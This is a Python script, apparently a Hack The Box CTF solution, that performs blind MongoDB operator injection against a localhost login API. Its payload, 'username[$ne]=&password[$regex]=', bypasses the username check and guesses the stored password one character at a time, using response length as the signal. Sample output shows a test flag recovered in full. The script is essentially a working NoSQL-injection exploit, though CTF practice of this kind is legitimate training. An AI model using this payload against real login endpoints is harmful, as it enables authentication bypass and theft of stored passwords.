#! /usr/bin/env python3
​
# From a HTB CTF that involved leaking a flag in password data via MongoDB injection

import requests
​
dict_file = 'dict.txt'
the_flag  = 'H'
headers   = {'Content-Type':'application/x-www-form-urlencoded','charset':'UTF-8'}
proxies   = {"http":"http://localhost:8080"}

def update_data(the_flag):

    with open(dict_file,'r') as the_dict:
        for char_str in the_dict:
            char_str = char_str.strip()
            post_data = ("username[$ne]=&password[$regex]=%s%s.{1}" %(the_flag, char_str) )
            r = requests.post('http://localhost:1337/api/login',\
                               data=post_data, headers=headers)
                               #data=post_data, headers=headers, proxies=proxies)

            resp = r.text
            the_answer = len(resp)
            #print("DEBUG: %s" % resp)

            if the_answer == 57:
                the_flag += char_str
                return(the_flag)

while the_flag:

    the_flag = update_data(the_flag)
    print(the_flag)

'''Output:

HTB
HTB{
HTB{f
HTB{f4
HTB{f4k
HTB{f4k3
HTB{f4k3_
HTB{f4k3_f
HTB{f4k3_fl
HTB{f4k3_fl4
HTB{f4k3_fl4g
HTB{f4k3_fl4g_
HTB{f4k3_fl4g_f
HTB{f4k3_fl4g_f0
HTB{f4k3_fl4g_f0r
HTB{f4k3_fl4g_f0r_
HTB{f4k3_fl4g_f0r_t
HTB{f4k3_fl4g_f0r_t3
HTB{f4k3_fl4g_f0r_t3s
HTB{f4k3_fl4g_f0r_t3st
HTB{f4k3_fl4g_f0r_t3st1
HTB{f4k3_fl4g_f0r_t3st1n
HTB{f4k3_fl4g_f0r_t3st1ng
None
'''
